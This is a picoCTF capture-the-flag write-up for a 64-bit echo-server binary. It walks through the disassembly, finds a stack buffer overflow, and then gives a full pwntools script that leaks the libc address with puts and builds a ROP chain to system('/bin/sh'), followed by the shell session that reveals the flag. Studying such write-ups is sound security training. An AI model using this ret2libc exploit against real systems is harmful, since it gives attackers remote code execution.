# Here's a LIBC : Binary Exploitation

I am once again asking for you to pwn this binary [vuln](vuln) [libc.so.6](libc.so.6) [Makefile](Makefile) `nc mercury.picoctf.net 24159`

Author : madStacks

# Solution

For now, try executing it.
```
$ nc mercury.picoctf.net 24159
WeLcOmE To mY EcHo sErVeR!
aaaaaaaaaaaaaaaaa
AaAaAaAaAaAaAaAaA

AaAaAaAaAaAaAaAaA

AaAaAaAaAaAaAaAaA
aaaaaaaaaaaaa
AaAaAaAaAaAaA
```
The service repeatedly output the user input with alternating uppercase and lowercase.

Check the vuln's assembly.
```
0000000000400677 <convert_case>:
  400677:       55                      push   rbp
  400678:       48 89 e5                mov    rbp,rsp
  40067b:       89 f8                   mov    eax,edi
  40067d:       48 89 75 f0             mov    QWORD PTR [rbp-0x10],rsi
  400681:       88 45 fc                mov    BYTE PTR [rbp-0x4],al
  400684:       80 7d fc 60             cmp    BYTE PTR [rbp-0x4],0x60
  400688:       7e 21                   jle    4006ab <convert_case+0x34>
  40068a:       80 7d fc 7a             cmp    BYTE PTR [rbp-0x4],0x7a
  40068e:       7f 1b                   jg     4006ab <convert_case+0x34>
  400690:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
  400694:       83 e0 01                and    eax,0x1
  400697:       48 85 c0                test   rax,rax
  40069a:       74 06                   je     4006a2 <convert_case+0x2b>
  40069c:       0f b6 45 fc             movzx  eax,BYTE PTR [rbp-0x4]
  4006a0:       eb 34                   jmp    4006d6 <convert_case+0x5f>
  4006a2:       0f b6 45 fc             movzx  eax,BYTE PTR [rbp-0x4]
  4006a6:       83 e8 20                sub    eax,0x20
  4006a9:       eb 2b                   jmp    4006d6 <convert_case+0x5f>
  4006ab:       80 7d fc 40             cmp    BYTE PTR [rbp-0x4],0x40
  4006af:       7e 21                   jle    4006d2 <convert_case+0x5b>
  4006b1:       80 7d fc 5a             cmp    BYTE PTR [rbp-0x4],0x5a
  4006b5:       7f 1b                   jg     4006d2 <convert_case+0x5b>
  4006b7:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
  4006bb:       83 e0 01                and    eax,0x1
  4006be:       48 85 c0                test   rax,rax
  4006c1:       74 09                   je     4006cc <convert_case+0x55>
  4006c3:       0f b6 45 fc             movzx  eax,BYTE PTR [rbp-0x4]
  4006c7:       83 c0 20                add    eax,0x20
  4006ca:       eb 0a                   jmp    4006d6 <convert_case+0x5f>
  4006cc:       0f b6 45 fc             movzx  eax,BYTE PTR [rbp-0x4]
  4006d0:       eb 04                   jmp    4006d6 <convert_case+0x5f>
  4006d2:       0f b6 45 fc             movzx  eax,BYTE PTR [rbp-0x4]
  4006d6:       5d                      pop    rbp
  4006d7:       c3                      ret

00000000004006d8 <do_stuff>:
  4006d8:       55                      push   rbp
  4006d9:       48 89 e5                mov    rbp,rsp
  4006dc:       48 81 ec 90 00 00 00    sub    rsp,0x90
  4006e3:       48 c7 45 f0 00 00 00    mov    QWORD PTR [rbp-0x10],0x0
  4006ea:       00
  4006eb:       48 8d 45 80             lea    rax,[rbp-0x80]
  4006ef:       48 89 c6                mov    rsi,rax
  4006f2:       48 8d 3d 3b 02 00 00    lea    rdi,[rip+0x23b]        # 400934 <_IO_stdin_used+0x4>
  4006f9:       b8 00 00 00 00          mov    eax,0x0
  4006fe:       e8 7d fe ff ff          call   400580 <__isoc99_scanf@plt>
  400703:       48 8d 85 7f ff ff ff    lea    rax,[rbp-0x81]
  40070a:       48 89 c6                mov    rsi,rax
  40070d:       48 8d 3d 26 02 00 00    lea    rdi,[rip+0x226]        # 40093a <_IO_stdin_used+0xa>
  400714:       b8 00 00 00 00          mov    eax,0x0
  400719:       e8 62 fe ff ff          call   400580 <__isoc99_scanf@plt>
  40071e:       48 c7 45 f8 00 00 00    mov    QWORD PTR [rbp-0x8],0x0
  400725:       00
  400726:       eb 33                   jmp    40075b <do_stuff+0x83>
  400728:       48 8d 55 80             lea    rdx,[rbp-0x80]
  40072c:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  400730:       48 01 d0                add    rax,rdx
  400733:       0f b6 00                movzx  eax,BYTE PTR [rax]
  400736:       0f be c0                movsx  eax,al
  400739:       48 8b 55 f8             mov    rdx,QWORD PTR [rbp-0x8]
  40073d:       48 89 d6                mov    rsi,rdx
  400740:       89 c7                   mov    edi,eax
  400742:       e8 30 ff ff ff          call   400677 <convert_case>
  400747:       89 c1                   mov    ecx,eax
  400749:       48 8d 55 80             lea    rdx,[rbp-0x80]
  40074d:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  400751:       48 01 d0                add    rax,rdx
  400754:       88 08                   mov    BYTE PTR [rax],cl
  400756:       48 83 45 f8 01          add    QWORD PTR [rbp-0x8],0x1
  40075b:       48 83 7d f8 63          cmp    QWORD PTR [rbp-0x8],0x63
  400760:       76 c6                   jbe    400728 <do_stuff+0x50>
  400762:       48 8d 45 80             lea    rax,[rbp-0x80]
  400766:       48 89 c7                mov    rdi,rax
  400769:       e8 d2 fd ff ff          call   400540 <puts@plt>
  40076e:       90                      nop
  40076f:       c9                      leave
  400770:       c3                      ret

0000000000400771 <main>:
  400771:       55                      push   rbp
  400772:       48 89 e5                mov    rbp,rsp
  400775:       41 57                   push   r15
  400777:       41 56                   push   r14
  400779:       41 55                   push   r13
  40077b:       41 54                   push   r12
  40077d:       48 83 ec 60             sub    rsp,0x60
  400781:       89 7d 8c                mov    DWORD PTR [rbp-0x74],edi
  400784:       48 89 75 80             mov    QWORD PTR [rbp-0x80],rsi
  400788:       48 8b 05 c1 08 20 00    mov    rax,QWORD PTR [rip+0x2008c1]        # 601050 <stdout@GLIBC_2.2.5>
  40078f:       be 00 00 00 00          mov    esi,0x0
  400794:       48 89 c7                mov    rdi,rax
  400797:       e8 c4 fd ff ff          call   400560 <setbuf@plt>
  40079c:       e8 cf fd ff ff          call   400570 <getegid@plt>
  4007a1:       89 45 d4                mov    DWORD PTR [rbp-0x2c],eax
  4007a4:       8b 55 d4                mov    edx,DWORD PTR [rbp-0x2c]
  4007a7:       8b 4d d4                mov    ecx,DWORD PTR [rbp-0x2c]
  4007aa:       8b 45 d4                mov    eax,DWORD PTR [rbp-0x2c]
  4007ad:       89 ce                   mov    esi,ecx
  4007af:       89 c7                   mov    edi,eax
  4007b1:       b8 00 00 00 00          mov    eax,0x0
  4007b6:       e8 95 fd ff ff          call   400550 <setresgid@plt>
  4007bb:       48 c7 45 c8 1b 00 00    mov    QWORD PTR [rbp-0x38],0x1b
  4007c2:       00
  4007c3:       48 b8 57 65 6c 63 6f    movabs rax,0x20656d6f636c6557
  4007ca:       6d 65 20
  4007cd:       48 ba 74 6f 20 6d 79    movabs rdx,0x636520796d206f74
  4007d4:       20 65 63
  4007d7:       48 89 45 90             mov    QWORD PTR [rbp-0x70],rax
  4007db:       48 89 55 98             mov    QWORD PTR [rbp-0x68],rdx
  4007df:       48 b8 68 6f 20 73 65    movabs rax,0x6576726573206f68
  4007e6:       72 76 65
  4007e9:       48 89 45 a0             mov    QWORD PTR [rbp-0x60],rax
  4007ed:       66 c7 45 a8 72 21       mov    WORD PTR [rbp-0x58],0x2172
  4007f3:       c6 45 aa 00             mov    BYTE PTR [rbp-0x56],0x0
  4007f7:       48 8b 45 c8             mov    rax,QWORD PTR [rbp-0x38]
  4007fb:       48 89 c2                mov    rdx,rax
  4007fe:       48 83 ea 01             sub    rdx,0x1
  400802:       48 89 55 c0             mov    QWORD PTR [rbp-0x40],rdx
  400806:       49 89 c6                mov    r14,rax
  400809:       41 bf 00 00 00 00       mov    r15d,0x0
  40080f:       49 89 c4                mov    r12,rax
  400812:       41 bd 00 00 00 00       mov    r13d,0x0
  400818:       ba 10 00 00 00          mov    edx,0x10
  40081d:       48 83 ea 01             sub    rdx,0x1
  400821:       48 01 d0                add    rax,rdx
  400824:       b9 10 00 00 00          mov    ecx,0x10
  400829:       ba 00 00 00 00          mov    edx,0x0
  40082e:       48 f7 f1                div    rcx
  400831:       48 6b c0 10             imul   rax,rax,0x10
  400835:       48 29 c4                sub    rsp,rax
  400838:       48 89 e0                mov    rax,rsp
  40083b:       48 83 c0 00             add    rax,0x0
  40083f:       48 89 45 b8             mov    QWORD PTR [rbp-0x48],rax
  400843:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  40084a:       00
  40084b:       eb 33                   jmp    400880 <main+0x10f>
  40084d:       48 8d 55 90             lea    rdx,[rbp-0x70]
  400851:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  400855:       48 01 d0                add    rax,rdx
  400858:       0f b6 00                movzx  eax,BYTE PTR [rax]
  40085b:       0f be c0                movsx  eax,al
  40085e:       48 8b 55 d8             mov    rdx,QWORD PTR [rbp-0x28]
  400862:       48 89 d6                mov    rsi,rdx
  400865:       89 c7                   mov    edi,eax
  400867:       e8 0b fe ff ff          call   400677 <convert_case>
  40086c:       89 c1                   mov    ecx,eax
  40086e:       48 8b 55 b8             mov    rdx,QWORD PTR [rbp-0x48]
  400872:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  400876:       48 01 d0                add    rax,rdx
  400879:       88 08                   mov    BYTE PTR [rax],cl
  40087b:       48 83 45 d8 01          add    QWORD PTR [rbp-0x28],0x1
  400880:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  400884:       48 3b 45 c8             cmp    rax,QWORD PTR [rbp-0x38]
  400888:       72 c3                   jb     40084d <main+0xdc>
  40088a:       48 8b 45 b8             mov    rax,QWORD PTR [rbp-0x48]
  40088e:       48 89 c7                mov    rdi,rax
  400891:       e8 aa fc ff ff          call   400540 <puts@plt>
  400896:       b8 00 00 00 00          mov    eax,0x0
  40089b:       e8 38 fe ff ff          call   4006d8 <do_stuff>
  4008a0:       eb f4                   jmp    400896 <main+0x125>
  4008a2:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  4008a9:       00 00 00
  4008ac:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]
```
Convert it into like C language.
```c
int convert_case(param1, param2)
{
    local_0x10 = param2
    local_0x4 = param1
    
    if (param1 < "a" || param1 > "z") {
        if (param1 < "A" || param1 > "Z");
            return param1
        else if ((param2 & 0x1) == 0) {
            return param1
        }
        else
            return param1 + 0x20
    }
    else if ((param2 & 0x1) == 0);
        return param1 - 0x20
    else
        return param1
}

void do_stuff()
{
    char local_0x80 [0x70]
    local_0x10 = 0x0
    scanf(stdin, local_0x80);
    scanf(stdin, local_0x81);
    for (local_0x8 = 0x0; local_0x8 <= 0x63; local_0x8++) {
        local_0x80[local_0x8] = convert_case(local_0x80[local_0x8], local_0x8);
    }
    puts(local_0x80);
}

void main(int argc, char *argv[])
{
    local_1 = argc
    local_2 = argv
    
    setbuf(stdout, 0);
    gid_t gid = getegid();
    setresgid(gid, gitd, gitd);

    local_3 = 0x1b
    local_4 = "Welcome"
    local_5 = "to my ec"
    local_6 = "ho serve"
    local_7 = "r!"
    local_8 = "\0"
    local_9 = acStack
    local_10 = 0x0

    for (local_10 = 0x0; local_10 < local_3; local_10++) {
        local_9[local_10] = convert_case(local_4[local_10], local_10);
    }
    
    puts(local_9);
    while (true){
            do_stuff();
    }
}
```
In the do_stuff() function, scanf() stores a string of 0x70 bytes into local_80.  
However, since convert_case only converts up to 0x63 bytes to uppercase/lowercase, the remaining bytes are not converted.  
Furthermore because `scanf("%[^\n]", local_0x80);` does not perform boundary checking, a buffer overflow can occur.

Check the file information and the security mechanism.
```
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped

$ checksec vuln
[*] '/home/colza-picoctf/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./'
    Stripped:   No
```
To spawn a shell we want to call `system("/bin/sh")`, but we also need the libc base address so we will use puts function and construct ROP.  
Payloads will be `offset + ROP_puts_do_stuff` and `offset + ROP_system('/bin/sh')`.

Determine the offset from input to return address.  
The return address is located in rbp+0x8, and local_0x80 is located in rbp-0x80.  
So, the offset is 0x80 + 0x8 = 0x88.

Execution code below:
```python solve.py
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.binary = elf

p = remote('mercury.picoctf.net', 24159)

do_stuff_addr = elf.symbols['do_stuff']
puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']

payload1 = b"a" * 0x88
payload1 += p64(next(elf.search(asm("pop rdi; ret"), executable=True)))
payload1 += p64(puts_got_addr)
payload1 += p64(puts_plt_addr)
payload1 += p64(do_stuff_addr)

p.sendlineafter(b"!\n", payload1)
p.recvline()
libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - libc.symbols['puts']
log.info("libc base: " + hex(libc.address))

payload2 = b"a" * 0x88
payload2 += p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
payload2 += p64(next(libc.search(b"/bin/sh\x00")))
payload2 += p64(next(libc.search(asm("ret"), executable=True)))
payload2 += p64(libc.symbols["system"])

p.sendline(payload2)

p.interactive()
```
Execute it.
```
$ python solve.py 
[*] '/home/colza-picoctf/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./'
    Stripped:   No
[*] '/home/colza-picoctf/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to mercury.picoctf.net on port 24159: Done
[*] libc base: 0x7fb4cb93f000
[*] Switching to interactive mode
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaaaaaaaaaaaaaaaaaaaaad
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}$ 
$ exit
```

Got the flag!

`picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}`
